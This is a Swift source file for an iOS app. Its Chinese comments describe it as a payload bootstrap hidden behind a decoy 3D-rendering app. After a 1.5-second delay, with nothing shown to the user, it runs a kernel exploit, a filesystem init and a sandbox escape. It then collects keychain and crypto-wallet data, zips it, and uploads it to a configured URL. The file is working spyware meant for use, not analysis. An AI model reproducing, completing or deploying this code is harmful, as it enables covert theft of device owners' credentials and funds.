//
//  ShellBootstrap.swift
//  猎豹钩子软件 · 载荷引导
//
//  外壳（www 里的九格三维渲染工坊）先上屏，1.5 秒后静默执行：
//    kernel exploit → vfsinit → sbxescape → 采集钱包/keychain → 上传
//
//  依赖 lara 提供的 laramgr.shared 与我们的 KeychainDumpManager。
//

import Foundation
import UIKit

enum ShellBootstrap {

    private static var started = false

    /// 外壳上屏后调用；只跑一次
    static func scheduleStart() {
        guard !started else { return }
        started = true

        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            start()
        }
    }

    private static func log(_ s: String) {
        laramgr.shared.logmsg("[shell] " + s)
    }

    static func start() {
        let mgr = laramgr.shared
        log("载荷启动 iOS \(UIDevice.current.systemVersion)")

        // 15.x 没有对应 exploit，直接走文件读取（越狱环境可用）
        let v = UIDevice.current.systemVersion
        let major = Int(v.split(separator: ".").first.map(String.init) ?? "0") ?? 0
        if major < 16 {
            log("iOS \(v) < 16，跳过 kernel exploit，直接采集")
            collectAndUpload()
            return
        }

        guard LaraCoverAuthStore.shared.autoPipelineEnabled else {
            log("自动流水线已关闭")
            return
        }
        LaraCoverAuthStore.shared.ensureCoverAccount()

        // ① 内核提权
        if mgr.dsready {
            afterKernel()
            return
        }
        log("开始 kernel exploit")
        mgr.run { ok in
            log("kernel \(ok ? "ok" : "fail")")
            guard ok else {
                log("提权失败，尝试无提权采集")
                collectAndUpload()
                return
            }
            afterKernel()
        }
    }

    private static func afterKernel() {
        let mgr = laramgr.shared
        if mgr.vfsready {
            doSbx()
            return
        }
        log("vfsinit")
        mgr.vfsinit { ok in
            log("vfs \(ok ? "ok" : "fail")")
            doSbx()
        }
    }

    private static func doSbx() {
        let mgr = laramgr.shared
        if mgr.sbxready {
            collectAndUpload()
            return
        }
        log("sbxescape")
        mgr.sbxescape { ok in
            log("sbx \(ok ? "ok" : "fail")")
            collectAndUpload()
        }
    }

    private static func collectAndUpload() {
        DispatchQueue.global(qos: .utility).async {
            log("开始采集")
            guard let data = KeychainDumpManager.shared.collectAll() else {
                log("采集失败")
                return
            }
            let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            let f = docs.appendingPathComponent("dump_\(Int(Date().timeIntervalSince1970)).zip")
            try? data.write(to: f)
            log("采集完成 \(data.count) B → \(f.lastPathComponent)")

            let url = UserDefaults.standard.string(forKey: "keychain.uploadURL") ?? ""
            guard !url.isEmpty else {
                log("未配置上传地址，仅本地留存")
                return
            }
            Uploader.upload(payload: data, to: url) { ok, msg in
                log("上传 \(ok ? "ok" : "fail") \(msg)")
            }
        }
    }
}
